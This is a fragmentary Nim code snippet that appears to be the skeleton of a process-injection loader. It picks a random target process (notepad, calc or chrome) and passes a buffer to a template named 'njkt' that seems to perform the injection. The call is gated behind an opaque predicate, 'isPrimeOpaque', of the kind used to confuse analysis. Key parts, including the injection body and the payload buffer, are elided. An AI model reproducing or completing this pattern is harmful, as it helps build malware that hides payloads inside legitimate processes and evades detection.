...
proc randomChoice(arr: array[3, string]): string =
    return arr[rand(arr.high)]

# Initialize the random number generator

proc processSelection(): string =
    # Define a sequence of strings representing process names
    var processSeq: array[3, string] = ["notepad.exe", "calc.exe", "chrome.exe"]
  
    # Select a random process from the sequence using sample
    var target_process: string = processSeq.randomChoice()
...
template njkt[I, T](buf: array[I, T], target_process: string): void =
...
when isMainModule:
    if isPrimeOpaque(1013):
            ...
            njkt(buf, target_process=processSelection())
